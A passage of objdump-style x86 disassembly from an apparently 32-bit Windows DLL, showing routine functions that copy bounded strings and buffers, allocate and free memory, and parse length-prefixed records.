10007f22:	8d 87 38 04 00 00    	lea    0x438(%edi),%eax
10007f28:	50                   	push   %eax
10007f29:	8b 45 f4             	mov    -0xc(%ebp),%eax
10007f2c:	6a 02                	push   $0x2
10007f2e:	59                   	pop    %ecx
10007f2f:	e8 42 21 00 00       	call   0x1000a076
10007f34:	ff 75 f8             	pushl  -0x8(%ebp)
10007f37:	89 45 fc             	mov    %eax,-0x4(%ebp)
10007f3a:	e8 d4 ea ff ff       	call   0x10006a13
10007f3f:	59                   	pop    %ecx
10007f40:	8b c7                	mov    %edi,%eax
10007f42:	e8 f0 00 00 00       	call   0x10008037
10007f47:	8b 45 fc             	mov    -0x4(%ebp),%eax
10007f4a:	5f                   	pop    %edi
10007f4b:	5e                   	pop    %esi
10007f4c:	5b                   	pop    %ebx
10007f4d:	c9                   	leave  
10007f4e:	c3                   	ret    
10007f4f:	51                   	push   %ecx
10007f50:	56                   	push   %esi
10007f51:	57                   	push   %edi
10007f52:	8b f8                	mov    %eax,%edi
10007f54:	e8 57 f4 ff ff       	call   0x100073b0
10007f59:	85 c0                	test   %eax,%eax
10007f5b:	75 04                	jne    0x10007f61
10007f5d:	33 c0                	xor    %eax,%eax
10007f5f:	eb 72                	jmp    0x10007fd3
10007f61:	e8 e8 ed ff ff       	call   0x10006d4e
10007f66:	85 c0                	test   %eax,%eax
10007f68:	74 07                	je     0x10007f71
10007f6a:	e8 1c 07 00 00       	call   0x1000868b
10007f6f:	eb 02                	jmp    0x10007f73
10007f71:	33 c0                	xor    %eax,%eax
10007f73:	89 47 10             	mov    %eax,0x10(%edi)
10007f76:	85 c0                	test   %eax,%eax
10007f78:	74 e3                	je     0x10007f5d
10007f7a:	e8 b1 ed ff ff       	call   0x10006d30
10007f7f:	8b 47 10             	mov    0x10(%edi),%eax
10007f82:	8b cf                	mov    %edi,%ecx
10007f84:	e8 8a ed ff ff       	call   0x10006d13
10007f89:	8b 4f 04             	mov    0x4(%edi),%ecx
10007f8c:	8b 47 10             	mov    0x10(%edi),%eax
10007f8f:	e8 8a ed ff ff       	call   0x10006d1e
10007f94:	8b 77 10             	mov    0x10(%edi),%esi
10007f97:	e8 be ed ff ff       	call   0x10006d5a
10007f9c:	85 c0                	test   %eax,%eax
10007f9e:	74 bd                	je     0x10007f5d
10007fa0:	8b c7                	mov    %edi,%eax
10007fa2:	e8 13 fd ff ff       	call   0x10007cba
10007fa7:	85 c0                	test   %eax,%eax
10007fa9:	74 b2                	je     0x10007f5d
10007fab:	68 0c eb 00 10       	push   $0x1000eb0c
10007fb0:	68 00 02 00 00       	push   $0x200
10007fb5:	8d 4f 14             	lea    0x14(%edi),%ecx
10007fb8:	e8 2f ae ff ff       	call   0x10002dec
10007fbd:	e8 19 fe ff ff       	call   0x10007ddb
10007fc2:	85 c0                	test   %eax,%eax
10007fc4:	74 97                	je     0x10007f5d
10007fc6:	8b c7                	mov    %edi,%eax
10007fc8:	e8 c8 fe ff ff       	call   0x10007e95
10007fcd:	f7 d8                	neg    %eax
10007fcf:	1b c0                	sbb    %eax,%eax
10007fd1:	f7 d8                	neg    %eax
10007fd3:	5f                   	pop    %edi
10007fd4:	5e                   	pop    %esi
10007fd5:	59                   	pop    %ecx
10007fd6:	c3                   	ret    
10007fd7:	8b 80 1c 04 00 00    	mov    0x41c(%eax),%eax
10007fdd:	c3                   	ret    
10007fde:	83 be 1c 06 00 00 00 	cmpl   $0x0,0x61c(%esi)
10007fe5:	74 11                	je     0x10007ff8
10007fe7:	8d 86 20 06 00 00    	lea    0x620(%esi),%eax
10007fed:	85 c0                	test   %eax,%eax
10007fef:	74 07                	je     0x10007ff8
10007ff1:	50                   	push   %eax
10007ff2:	e8 1c ea ff ff       	call   0x10006a13
10007ff7:	59                   	pop    %ecx
10007ff8:	57                   	push   %edi
10007ff9:	8b 7e 10             	mov    0x10(%esi),%edi
10007ffc:	85 ff                	test   %edi,%edi
10007ffe:	74 0e                	je     0x1000800e
10008000:	8b c7                	mov    %edi,%eax
10008002:	e8 3c ed ff ff       	call   0x10006d43
10008007:	57                   	push   %edi
10008008:	e8 40 fc ff ff       	call   0x10007c4d
1000800d:	59                   	pop    %ecx
1000800e:	8d 86 20 04 00 00    	lea    0x420(%esi),%eax
10008014:	50                   	push   %eax
10008015:	ff 15 68 e1 00 10    	call   *0x1000e168
1000801b:	8d 86 38 04 00 00    	lea    0x438(%esi),%eax
10008021:	5f                   	pop    %edi
10008022:	e9 af 1e 00 00       	jmp    0x10009ed6
10008027:	05 20 04 00 00       	add    $0x420,%eax
1000802c:	50                   	push   %eax
1000802d:	ff 15 64 e1 00 10    	call   *0x1000e164
10008033:	33 c0                	xor    %eax,%eax
10008035:	40                   	inc    %eax
10008036:	c3                   	ret    
10008037:	05 20 04 00 00       	add    $0x420,%eax
1000803c:	50                   	push   %eax
1000803d:	ff 15 60 e1 00 10    	call   *0x1000e160
10008043:	c3                   	ret    
10008044:	55                   	push   %ebp
10008045:	8b ec                	mov    %esp,%ebp
10008047:	51                   	push   %ecx
10008048:	51                   	push   %ecx
10008049:	8b 45 08             	mov    0x8(%ebp),%eax
1000804c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000804f:	8b 00                	mov    (%eax),%eax
10008051:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10008055:	83 c1 fc             	add    $0xfffffffc,%ecx
10008058:	53                   	push   %ebx
10008059:	56                   	push   %esi
1000805a:	3b c1                	cmp    %ecx,%eax
1000805c:	73 58                	jae    0x100080b6
1000805e:	83 f8 03             	cmp    $0x3,%eax
10008061:	76 53                	jbe    0x100080b6
10008063:	8b c7                	mov    %edi,%eax
10008065:	e8 bd ff ff ff       	call   0x10008027
1000806a:	85 c0                	test   %eax,%eax
1000806c:	74 48                	je     0x100080b6
1000806e:	8d b7 20 06 00 00    	lea    0x620(%edi),%esi
10008074:	56                   	push   %esi
10008075:	8d 87 38 04 00 00    	lea    0x438(%edi),%eax
1000807b:	50                   	push   %eax
1000807c:	6a 03                	push   $0x3
1000807e:	b8 00 04 00 00       	mov    $0x400,%eax
10008083:	59                   	pop    %ecx
10008084:	e8 02 20 00 00       	call   0x1000a08b
10008089:	8b d8                	mov    %eax,%ebx
1000808b:	85 db                	test   %ebx,%ebx
1000808d:	74 20                	je     0x100080af
1000808f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10008092:	8b 45 08             	mov    0x8(%ebp),%eax
10008095:	68 14 01 00 00       	push   $0x114
1000809a:	56                   	push   %esi
1000809b:	e8 41 1b 00 00       	call   0x10009be1
100080a0:	53                   	push   %ebx
100080a1:	6a 00                	push   $0x0
100080a3:	56                   	push   %esi
100080a4:	89 45 fc             	mov    %eax,-0x4(%ebp)
100080a7:	e8 7e 5c 00 00       	call   0x1000dd2a
100080ac:	83 c4 14             	add    $0x14,%esp
100080af:	8b c7                	mov    %edi,%eax
100080b1:	e8 81 ff ff ff       	call   0x10008037
100080b6:	8b 45 fc             	mov    -0x4(%ebp),%eax
100080b9:	5e                   	pop    %esi
100080ba:	5b                   	pop    %ebx
100080bb:	c9                   	leave  
100080bc:	c2 08 00             	ret    $0x8
100080bf:	55                   	push   %ebp
100080c0:	8b ec                	mov    %esp,%ebp
100080c2:	51                   	push   %ecx
100080c3:	51                   	push   %ecx
100080c4:	8b 45 08             	mov    0x8(%ebp),%eax
100080c7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100080ca:	8b 00                	mov    (%eax),%eax
100080cc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100080d0:	83 c1 fc             	add    $0xfffffffc,%ecx
100080d3:	53                   	push   %ebx
100080d4:	57                   	push   %edi
100080d5:	3b c1                	cmp    %ecx,%eax
100080d7:	73 60                	jae    0x10008139
100080d9:	83 f8 03             	cmp    $0x3,%eax
100080dc:	76 5b                	jbe    0x10008139
100080de:	8b c6                	mov    %esi,%eax
100080e0:	e8 42 ff ff ff       	call   0x10008027
100080e5:	85 c0                	test   %eax,%eax
100080e7:	74 50                	je     0x10008139
100080e9:	8d 9e 20 06 00 00    	lea    0x620(%esi),%ebx
100080ef:	53                   	push   %ebx
100080f0:	8d 86 38 04 00 00    	lea    0x438(%esi),%eax
100080f6:	50                   	push   %eax
100080f7:	6a 03                	push   $0x3
100080f9:	b8 00 04 00 00       	mov    $0x400,%eax
100080fe:	59                   	pop    %ecx
100080ff:	e8 87 1f 00 00       	call   0x1000a08b
10008104:	8b f8                	mov    %eax,%edi
10008106:	85 ff                	test   %edi,%edi
10008108:	74 28                	je     0x10008132
1000810a:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000810d:	8d 87 ec fe ff ff    	lea    -0x114(%edi),%eax
10008113:	50                   	push   %eax
10008114:	8d 86 34 07 00 00    	lea    0x734(%esi),%eax
1000811a:	50                   	push   %eax
1000811b:	8b 45 0c             	mov    0xc(%ebp),%eax
1000811e:	e8 62 1d 00 00       	call   0x10009e85
10008123:	57                   	push   %edi
10008124:	6a 00                	push   $0x0
10008126:	53                   	push   %ebx
10008127:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000812a:	e8 fb 5b 00 00       	call   0x1000dd2a
1000812f:	83 c4 14             	add    $0x14,%esp
10008132:	8b c6                	mov    %esi,%eax
10008134:	e8 fe fe ff ff       	call   0x10008037
10008139:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000813c:	5f                   	pop    %edi
1000813d:	5b                   	pop    %ebx
1000813e:	c9                   	leave  
1000813f:	c2 08 00             	ret    $0x8
10008142:	55                   	push   %ebp
10008143:	8b ec                	mov    %esp,%ebp
10008145:	ff 75 0c             	pushl  0xc(%ebp)
10008148:	ff 15 34 e1 00 10    	call   *0x1000e134
1000814e:	40                   	inc    %eax
1000814f:	3d 00 02 00 00       	cmp    $0x200,%eax
10008154:	77 13                	ja     0x10008169
10008156:	50                   	push   %eax
10008157:	8b 45 08             	mov    0x8(%ebp),%eax
1000815a:	ff 75 0c             	pushl  0xc(%ebp)
1000815d:	83 c0 14             	add    $0x14,%eax
10008160:	50                   	push   %eax
10008161:	e8 aa 5b 00 00       	call   0x1000dd10
10008166:	83 c4 0c             	add    $0xc,%esp
10008169:	5d                   	pop    %ebp
1000816a:	c2 08 00             	ret    $0x8
1000816d:	55                   	push   %ebp
1000816e:	8b ec                	mov    %esp,%ebp
10008170:	ff 75 0c             	pushl  0xc(%ebp)
10008173:	ff 15 34 e1 00 10    	call   *0x1000e134
10008179:	40                   	inc    %eax
1000817a:	3d 00 01 00 00       	cmp    $0x100,%eax
1000817f:	77 15                	ja     0x10008196
10008181:	50                   	push   %eax
10008182:	8b 45 08             	mov    0x8(%ebp),%eax
10008185:	ff 75 0c             	pushl  0xc(%ebp)
10008188:	05 14 02 00 00       	add    $0x214,%eax
1000818d:	50                   	push   %eax
1000818e:	e8 7d 5b 00 00       	call   0x1000dd10
10008193:	83 c4 0c             	add    $0xc,%esp
10008196:	5d                   	pop    %ebp
10008197:	c2 08 00             	ret    $0x8
1000819a:	55                   	push   %ebp
1000819b:	8b ec                	mov    %esp,%ebp
1000819d:	ff 75 0c             	pushl  0xc(%ebp)
100081a0:	ff 15 34 e1 00 10    	call   *0x1000e134
100081a6:	40                   	inc    %eax
100081a7:	3d 80 00 00 00       	cmp    $0x80,%eax
100081ac:	77 15                	ja     0x100081c3
100081ae:	50                   	push   %eax
100081af:	8b 45 08             	mov    0x8(%ebp),%eax
100081b2:	ff 75 0c             	pushl  0xc(%ebp)
100081b5:	05 94 03 00 00       	add    $0x394,%eax
100081ba:	50                   	push   %eax
100081bb:	e8 50 5b 00 00       	call   0x1000dd10
100081c0:	83 c4 0c             	add    $0xc,%esp
100081c3:	5d                   	pop    %ebp
100081c4:	c2 08 00             	ret    $0x8
100081c7:	c7 80 20 0a 00 00 2b 	movl   $0x1000c92b,0xa20(%eax)
100081ce:	c9 00 10 
100081d1:	89 88 24 0a 00 00    	mov    %ecx,0xa24(%eax)
100081d7:	33 c0                	xor    %eax,%eax
100081d9:	40                   	inc    %eax
100081da:	c3                   	ret    
100081db:	55                   	push   %ebp
100081dc:	8b ec                	mov    %esp,%ebp
100081de:	81 ec 14 01 00 00    	sub    $0x114,%esp
100081e4:	68 4c eb 00 10       	push   $0x1000eb4c
100081e9:	6a 10                	push   $0x10
100081eb:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
100081f0:	58                   	pop    %eax
100081f1:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
100081f7:	e8 a6 ac ff ff       	call   0x10002ea2
100081fc:	ff 15 98 e0 00 10    	call   *0x1000e098
10008202:	ff 75 08             	pushl  0x8(%ebp)
10008205:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
1000820b:	68 00 01 00 00       	push   $0x100
10008210:	89 85 fc fe ff ff    	mov    %eax,-0x104(%ebp)
10008216:	e8 d1 ab ff ff       	call   0x10002dec
1000821b:	ff 75 0c             	pushl  0xc(%ebp)
1000821e:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
10008224:	50                   	push   %eax
10008225:	e8 18 e8 ff ff       	call   0x10006a42
1000822a:	59                   	pop    %ecx
1000822b:	59                   	pop    %ecx
1000822c:	c9                   	leave  
1000822d:	c3                   	ret    
1000822e:	55                   	push   %ebp
1000822f:	8b ec                	mov    %esp,%ebp
10008231:	69 d2 04 10 00 00    	imul   $0x1004,%edx,%edx
10008237:	56                   	push   %esi
10008238:	8d 34 3a             	lea    (%edx,%edi,1),%esi
1000823b:	8b 0e                	mov    (%esi),%ecx
1000823d:	33 c0                	xor    %eax,%eax
1000823f:	83 f9 10             	cmp    $0x10,%ecx
10008242:	7d 1b                	jge    0x1000825f
10008244:	ff 75 08             	pushl  0x8(%ebp)
10008247:	c1 e1 08             	shl    $0x8,%ecx
1000824a:	03 ca                	add    %edx,%ecx
1000824c:	68 00 01 00 00       	push   $0x100
10008251:	8d 4c 39 04          	lea    0x4(%ecx,%edi,1),%ecx
10008255:	e8 92 ab ff ff       	call   0x10002dec
1000825a:	ff 06                	incl   (%esi)
1000825c:	33 c0                	xor    %eax,%eax
1000825e:	40                   	inc    %eax
1000825f:	5e                   	pop    %esi
10008260:	5d                   	pop    %ebp
10008261:	c2 04 00             	ret    $0x4
10008264:	55                   	push   %ebp
10008265:	8b ec                	mov    %esp,%ebp
10008267:	51                   	push   %ecx
10008268:	56                   	push   %esi
10008269:	57                   	push   %edi
1000826a:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000826d:	50                   	push   %eax
1000826e:	33 ff                	xor    %edi,%edi
10008270:	57                   	push   %edi
10008271:	57                   	push   %edi
10008272:	ff 75 14             	pushl  0x14(%ebp)
10008275:	89 7d fc             	mov    %edi,-0x4(%ebp)
10008278:	ff 75 10             	pushl  0x10(%ebp)
1000827b:	ff 75 0c             	pushl  0xc(%ebp)
1000827e:	e8 a4 ed ff ff       	call   0x10007027
10008283:	8b f0                	mov    %eax,%esi
10008285:	83 c4 18             	add    $0x18,%esp
10008288:	3b f7                	cmp    %edi,%esi
1000828a:	74 46                	je     0x100082d2
1000828c:	53                   	push   %ebx
1000828d:	56                   	push   %esi
1000828e:	e8 51 e7 ff ff       	call   0x100069e4
10008293:	8b d8                	mov    %eax,%ebx
10008295:	59                   	pop    %ecx
10008296:	3b df                	cmp    %edi,%ebx
10008298:	74 37                	je     0x100082d1
1000829a:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000829d:	50                   	push   %eax
1000829e:	56                   	push   %esi
1000829f:	53                   	push   %ebx
100082a0:	ff 75 14             	pushl  0x14(%ebp)
100082a3:	ff 75 10             	pushl  0x10(%ebp)
100082a6:	ff 75 0c             	pushl  0xc(%ebp)
100082a9:	e8 79 ed ff ff       	call   0x10007027
100082ae:	83 c4 18             	add    $0x18,%esp
100082b1:	85 c0                	test   %eax,%eax
100082b3:	74 15                	je     0x100082ca
100082b5:	53                   	push   %ebx
100082b6:	e8 0d d8 ff ff       	call   0x10005ac8
100082bb:	8b 55 18             	mov    0x18(%ebp),%edx
100082be:	8b 7d 08             	mov    0x8(%ebp),%edi
100082c1:	59                   	pop    %ecx
100082c2:	8b d8                	mov    %eax,%ebx
100082c4:	53                   	push   %ebx
100082c5:	e8 64 ff ff ff       	call   0x1000822e
100082ca:	53                   	push   %ebx
100082cb:	e8 43 e7 ff ff       	call   0x10006a13
100082d0:	59                   	pop    %ecx
100082d1:	5b                   	pop    %ebx
100082d2:	8b 45 fc             	mov    -0x4(%ebp),%eax
100082d5:	5f                   	pop    %edi
100082d6:	5e                   	pop    %esi
100082d7:	c9                   	leave  
100082d8:	c2 14 00             	ret    $0x14
100082db:	69 c0 04 10 00 00    	imul   $0x1004,%eax,%eax
100082e1:	83 24 08 00          	andl   $0x0,(%eax,%ecx,1)
100082e5:	c3                   	ret    
100082e6:	55                   	push   %ebp
100082e7:	8b ec                	mov    %esp,%ebp
100082e9:	8b 45 18             	mov    0x18(%ebp),%eax
100082ec:	8b 4d 08             	mov    0x8(%ebp),%ecx
100082ef:	e8 e7 ff ff ff       	call   0x100082db
100082f4:	8b 45 0c             	mov    0xc(%ebp),%eax
100082f7:	eb 18                	jmp    0x10008311
100082f9:	ff 75 18             	pushl  0x18(%ebp)
100082fc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100082ff:	ff 75 14             	pushl  0x14(%ebp)
10008302:	2b c8                	sub    %eax,%ecx
10008304:	03 4d 10             	add    0x10(%ebp),%ecx
10008307:	51                   	push   %ecx
10008308:	50                   	push   %eax
10008309:	ff 75 08             	pushl  0x8(%ebp)
1000830c:	e8 53 ff ff ff       	call   0x10008264
10008311:	85 c0                	test   %eax,%eax
10008313:	75 e4                	jne    0x100082f9
10008315:	40                   	inc    %eax
10008316:	5d                   	pop    %ebp
10008317:	c2 14 00             	ret    $0x14
1000831a:	69 c0 04 10 00 00    	imul   $0x1004,%eax,%eax
10008320:	8b 04 08             	mov    (%eax,%ecx,1),%eax
10008323:	c3                   	ret    
10008324:	55                   	push   %ebp
10008325:	8b ec                	mov    %esp,%ebp
10008327:	69 c0 04 10 00 00    	imul   $0x1004,%eax,%eax
1000832d:	03 45 08             	add    0x8(%ebp),%eax
10008330:	53                   	push   %ebx
10008331:	c1 e1 08             	shl    $0x8,%ecx
10008334:	56                   	push   %esi
10008335:	8d 74 01 04          	lea    0x4(%ecx,%eax,1),%esi
10008339:	8b 45 0c             	mov    0xc(%ebp),%eax
1000833c:	8b ce                	mov    %esi,%ecx
1000833e:	57                   	push   %edi
1000833f:	33 db                	xor    %ebx,%ebx
10008341:	bf 00 01 00 00       	mov    $0x100,%edi
10008346:	2b c8                	sub    %eax,%ecx
10008348:	8d 97 fe fe ff 7f    	lea    0x7ffffefe(%edi),%edx
1000834e:	85 d2                	test   %edx,%edx
10008350:	74 0d                	je     0x1000835f
10008352:	8a 14 01             	mov    (%ecx,%eax,1),%dl
10008355:	84 d2                	test   %dl,%dl
10008357:	74 06                	je     0x1000835f
10008359:	88 10                	mov    %dl,(%eax)
1000835b:	40                   	inc    %eax
1000835c:	4f                   	dec    %edi
1000835d:	75 e9                	jne    0x10008348
1000835f:	85 ff                	test   %edi,%edi
10008361:	75 06                	jne    0x10008369
10008363:	48                   	dec    %eax
10008364:	bb 7a 00 07 80       	mov    $0x8007007a,%ebx
10008369:	c6 00 00             	movb   $0x0,(%eax)
1000836c:	85 db                	test   %ebx,%ebx
1000836e:	75 0a                	jne    0x1000837a
10008370:	56                   	push   %esi
10008371:	ff 15 34 e1 00 10    	call   *0x1000e134
10008377:	40                   	inc    %eax
10008378:	eb 02                	jmp    0x1000837c
1000837a:	33 c0                	xor    %eax,%eax
1000837c:	5f                   	pop    %edi
1000837d:	5e                   	pop    %esi
1000837e:	5b                   	pop    %ebx
1000837f:	5d                   	pop    %ebp
10008380:	c2 08 00             	ret    $0x8
10008383:	55                   	push   %ebp
10008384:	8b ec                	mov    %esp,%ebp
10008386:	56                   	push   %esi
10008387:	57                   	push   %edi
10008388:	33 f6                	xor    %esi,%esi
1000838a:	56                   	push   %esi
1000838b:	56                   	push   %esi
1000838c:	56                   	push   %esi
1000838d:	ff 75 14             	pushl  0x14(%ebp)
10008390:	ff 75 10             	pushl  0x10(%ebp)
10008393:	ff 75 0c             	pushl  0xc(%ebp)
10008396:	e8 8c ec ff ff       	call   0x10007027
1000839b:	8b f8                	mov    %eax,%edi
1000839d:	83 c4 18             	add    $0x18,%esp
100083a0:	3b fe                	cmp    %esi,%edi
100083a2:	74 40                	je     0x100083e4
100083a4:	53                   	push   %ebx
100083a5:	57                   	push   %edi
100083a6:	e8 39 e6 ff ff       	call   0x100069e4
100083ab:	8b d8                	mov    %eax,%ebx
100083ad:	59                   	pop    %ecx
100083ae:	3b de                	cmp    %esi,%ebx
100083b0:	74 31                	je     0x100083e3
100083b2:	56                   	push   %esi
100083b3:	57                   	push   %edi
100083b4:	53                   	push   %ebx
100083b5:	ff 75 14             	pushl  0x14(%ebp)
100083b8:	ff 75 10             	pushl  0x10(%ebp)
100083bb:	ff 75 0c             	pushl  0xc(%ebp)
100083be:	e8 64 ec ff ff       	call   0x10007027
100083c3:	83 c4 18             	add    $0x18,%esp
100083c6:	3b c6                	cmp    %esi,%eax
100083c8:	74 12                	je     0x100083dc
100083ca:	ff 75 1c             	pushl  0x1c(%ebp)
100083cd:	ff 75 18             	pushl  0x18(%ebp)
100083d0:	50                   	push   %eax
100083d1:	53                   	push   %ebx
100083d2:	ff 75 08             	pushl  0x8(%ebp)
100083d5:	e8 0c ff ff ff       	call   0x100082e6
100083da:	8b f0                	mov    %eax,%esi
100083dc:	53                   	push   %ebx
100083dd:	e8 31 e6 ff ff       	call   0x10006a13
100083e2:	59                   	pop    %ecx
100083e3:	5b                   	pop    %ebx
100083e4:	5f                   	pop    %edi
100083e5:	8b c6                	mov    %esi,%eax
100083e7:	5e                   	pop    %esi
100083e8:	5d                   	pop    %ebp
100083e9:	c2 18 00             	ret    $0x18
100083ec:	55                   	push   %ebp
100083ed:	8b ec                	mov    %esp,%ebp
100083ef:	33 c0                	xor    %eax,%eax
100083f1:	85 f6                	test   %esi,%esi
100083f3:	74 4e                	je     0x10008443
100083f5:	85 ff                	test   %edi,%edi
100083f7:	74 4a                	je     0x10008443
100083f9:	6a 01                	push   $0x1
100083fb:	68 a4 eb 00 10       	push   $0x1000eba4
10008400:	68 ac eb 00 10       	push   $0x1000ebac
10008405:	57                   	push   %edi
10008406:	56                   	push   %esi
10008407:	ff 75 08             	pushl  0x8(%ebp)
1000840a:	e8 74 ff ff ff       	call   0x10008383
1000840f:	85 c0                	test   %eax,%eax
10008411:	74 30                	je     0x10008443
10008413:	6a 02                	push   $0x2
10008415:	68 b8 eb 00 10       	push   $0x1000ebb8
1000841a:	68 c0 eb 00 10       	push   $0x1000ebc0
1000841f:	57                   	push   %edi
10008420:	56                   	push   %esi
10008421:	ff 75 08             	pushl  0x8(%ebp)
10008424:	e8 5a ff ff ff       	call   0x10008383
10008429:	85 c0                	test   %eax,%eax
1000842b:	74 16                	je     0x10008443
1000842d:	6a 00                	push   $0x0
1000842f:	68 c8 eb 00 10       	push   $0x1000ebc8
10008434:	68 d0 eb 00 10       	push   $0x1000ebd0
10008439:	57                   	push   %edi
1000843a:	56                   	push   %esi
1000843b:	ff 75 08             	pushl  0x8(%ebp)
1000843e:	e8 40 ff ff ff       	call   0x10008383
10008443:	5d                   	pop    %ebp
10008444:	c2 04 00             	ret    $0x4
10008447:	55                   	push   %ebp
10008448:	8b ec                	mov    %esp,%ebp
1000844a:	0f b7 46 04          	movzwl 0x4(%esi),%eax
1000844e:	39 45 0c             	cmp    %eax,0xc(%ebp)
10008451:	73 04                	jae    0x10008457
10008453:	33 c0                	xor    %eax,%eax
10008455:	5d                   	pop    %ebp
10008456:	c3                   	ret    
10008457:	50                   	push   %eax
10008458:	8d 46 06             	lea    0x6(%esi),%eax
1000845b:	50                   	push   %eax
1000845c:	ff 75 08             	pushl  0x8(%ebp)
1000845f:	e8 ac 58 00 00       	call   0x1000dd10
10008464:	0f b7 46 04          	movzwl 0x4(%esi),%eax
10008468:	83 c4 0c             	add    $0xc,%esp
1000846b:	5d                   	pop    %ebp
1000846c:	c3                   	ret    
1000846d:	55                   	push   %ebp
1000846e:	8b ec                	mov    %esp,%ebp
10008470:	0f b7 48 04          	movzwl 0x4(%eax),%ecx
10008474:	56                   	push   %esi
10008475:	8d 74 08 06          	lea    0x6(%eax,%ecx,1),%esi
10008479:	0f b7 06             	movzwl (%esi),%eax
1000847c:	b9 00 20 00 00       	mov    $0x2000,%ecx
10008481:	66 3b c8             	cmp    %ax,%cx
10008484:	73 04                	jae    0x1000848a
10008486:	33 c0                	xor    %eax,%eax
10008488:	eb 13                	jmp    0x1000849d
1000848a:	50                   	push   %eax
1000848b:	8d 46 02             	lea    0x2(%esi),%eax
1000848e:	50                   	push   %eax
1000848f:	ff 75 08             	pushl  0x8(%ebp)
10008492:	e8 79 58 00 00       	call   0x1000dd10
10008497:	0f b7 06             	movzwl (%esi),%eax
1000849a:	83 c4 0c             	add    $0xc,%esp
1000849d:	5e                   	pop    %esi
1000849e:	5d                   	pop    %ebp
1000849f:	c3                   	ret    
100084a0:	55                   	push   %ebp
100084a1:	8b ec                	mov    %esp,%ebp
100084a3:	0f b7 48 04          	movzwl 0x4(%eax),%ecx
100084a7:	8d 44 08 06          	lea    0x6(%eax,%ecx,1),%eax
100084ab:	0f b7 08             	movzwl (%eax),%ecx
100084ae:	56                   	push   %esi
100084af:	8d 74 08 02          	lea    0x2(%eax,%ecx,1),%esi
100084b3:	0f b7 06             	movzwl (%esi),%eax
100084b6:	39 45 0c             	cmp    %eax,0xc(%ebp)
100084b9:	73 04                	jae    0x100084bf
100084bb:	33 c0                	xor    %eax,%eax
100084bd:	eb 13                	jmp    0x100084d2
100084bf:	50                   	push   %eax
100084c0:	8d 46 02             	lea    0x2(%esi),%eax
100084c3:	50                   	push   %eax
100084c4:	ff 75 08             	pushl  0x8(%ebp)
100084c7:	e8 44 58 00 00       	call   0x1000dd10
100084cc:	0f b7 06             	movzwl (%esi),%eax
100084cf:	83 c4 0c             	add    $0xc,%esp
100084d2:	5e                   	pop    %esi
100084d3:	5d                   	pop    %ebp
100084d4:	c3                   	ret    
100084d5:	55                   	push   %ebp
100084d6:	8b ec                	mov    %esp,%ebp
100084d8:	83 7d 08 0a          	cmpl   $0xa,0x8(%ebp)
100084dc:	73 04                	jae    0x100084e2
100084de:	33 c0                	xor    %eax,%eax
100084e0:	5d                   	pop    %ebp
100084e1:	c3                   	ret    
100084e2:	8b 08                	mov    (%eax),%ecx
100084e4:	89 0a                	mov    %ecx,(%edx)
100084e6:	0f b7 48 04          	movzwl 0x4(%eax),%ecx
100084ea:	8b 44 01 06          	mov    0x6(%ecx,%eax,1),%eax
100084ee:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100084f1:	89 01                	mov    %eax,(%ecx)
100084f3:	33 c0                	xor    %eax,%eax
100084f5:	40                   	inc    %eax
100084f6:	5d                   	pop    %ebp
100084f7:	c3                   	ret    
100084f8:	55                   	push   %ebp
100084f9:	8b ec                	mov    %esp,%ebp
100084fb:	83 7d 08 0a          	cmpl   $0xa,0x8(%ebp)
100084ff:	73 04                	jae    0x10008505
10008501:	33 c0                	xor    %eax,%eax
10008503:	5d                   	pop    %ebp
10008504:	c3                   	ret    
10008505:	0f b7 50 04          	movzwl 0x4(%eax),%edx
10008509:	56                   	push   %esi
1000850a:	8d 74 10 06          	lea    0x6(%eax,%edx,1),%esi
1000850e:	8b c6                	mov    %esi,%eax
10008510:	83 c6 04             	add    $0x4,%esi
10008513:	3b 08                	cmp    (%eax),%ecx
10008515:	72 04                	jb     0x1000851b
10008517:	33 c0                	xor    %eax,%eax
10008519:	eb 70                	jmp    0x1000858b
1000851b:	85 c9                	test   %ecx,%ecx
1000851d:	74 10                	je     0x1000852f
1000851f:	49                   	dec    %ecx
10008520:	0f b7 06             	movzwl (%esi),%eax
10008523:	8d 44 06 02          	lea    0x2(%esi,%eax,1),%eax
10008527:	8b 10                	mov    (%eax),%edx
10008529:	8d 74 10 04          	lea    0x4(%eax,%edx,1),%esi
1000852d:	75 f0                	jne    0x1000851f
1000852f:	57                   	push   %edi
10008530:	8b fe                	mov    %esi,%edi
10008532:	0f b7 07             	movzwl (%edi),%eax
10008535:	83 c6 02             	add    $0x2,%esi
10008538:	40                   	inc    %eax
10008539:	50                   	push   %eax
1000853a:	e8 a5 e4 ff ff       	call   0x100069e4
1000853f:	59                   	pop    %ecx
10008540:	89 03                	mov    %eax,(%ebx)
10008542:	85 c0                	test   %eax,%eax
10008544:	74 2d                	je     0x10008573
10008546:	0f b7 0f             	movzwl (%edi),%ecx
10008549:	51                   	push   %ecx
1000854a:	56                   	push   %esi
1000854b:	50                   	push   %eax
1000854c:	e8 bf 57 00 00       	call   0x1000dd10
10008551:	0f b7 07             	movzwl (%edi),%eax
10008554:	03 f0                	add    %eax,%esi
10008556:	8b 06                	mov    (%esi),%eax
10008558:	50                   	push   %eax
10008559:	89 43 08             	mov    %eax,0x8(%ebx)
1000855c:	e8 83 e4 ff ff       	call   0x100069e4
10008561:	83 c4 10             	add    $0x10,%esp
10008564:	89 43 04             	mov    %eax,0x4(%ebx)
10008567:	85 c0                	test   %eax,%eax
10008569:	75 0c                	jne    0x10008577
1000856b:	ff 33                	pushl  (%ebx)
1000856d:	e8 a1 e4 ff ff       	call   0x10006a13
10008572:	59                   	pop    %ecx
10008573:	33 c0                	xor    %eax,%eax
10008575:	eb 13                	jmp    0x1000858a
10008577:	ff 73 08             	pushl  0x8(%ebx)
1000857a:	83 c6 04             	add    $0x4,%esi
1000857d:	56                   	push   %esi
